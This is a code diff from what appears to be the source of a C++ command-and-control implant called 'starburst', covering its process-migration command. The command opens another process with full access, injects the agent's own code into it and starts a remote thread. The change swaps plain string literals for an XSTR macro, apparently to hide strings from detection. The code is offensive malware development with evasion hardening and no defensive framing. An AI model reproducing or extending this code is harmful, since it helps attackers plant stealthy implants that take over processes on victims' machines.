@@ -20,7 +20,7 @@ auto declfn starburst::cmd_migrate(
     uint32_t pid = parser_int32( params );
     if ( pid == 0 ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "invalid PID" ) ) );
+            XSTR( "invalid PID" ) );
         return;
     }
 
@@ -29,7 +29,7 @@ auto declfn starburst::cmd_migrate(
     HANDLE h_proc = inst.kernel32.OpenProcess( PROCESS_ALL_ACCESS, FALSE, pid );
     if ( !h_proc ) {
         char msg[80] = { 0 };
-        str_copy( msg, symbol<char*>( const_cast<char*>( "OpenProcess failed for PID " ) ) );
+        str_copy( msg, XSTR( "OpenProcess failed for PID " ) );
         char num[16];
         int_to_str( num, pid, 10 );
         str_concat( msg, num );
@@ -43,7 +43,7 @@ auto declfn starburst::cmd_migrate(
     if ( !sc_base || sc_len == 0 ) {
         inst.kernel32.CloseHandle( h_proc );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "agent base/length not set" ) ) );
+            XSTR( "agent base/length not set" ) );
         return;
     }
 
@@ -52,7 +52,7 @@ auto declfn starburst::cmd_migrate(
     if ( !h_thread ) {
         inst.kernel32.CloseHandle( h_proc );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "injection failed" ) ) );
+            XSTR( "injection failed" ) );
         return;
     }
 
@@ -60,7 +60,7 @@ auto declfn starburst::cmd_migrate(
     inst.kernel32.CloseHandle( h_proc );
 
     char msg[80] = { 0 };
-    str_copy( msg, symbol<char*>( const_cast<char*>( "migrated to PID " ) ) );
+    str_copy( msg, XSTR( "migrated to PID " ) );
     char num[16];
     int_to_str( num, pid, 10 );
     str_concat( msg, num );
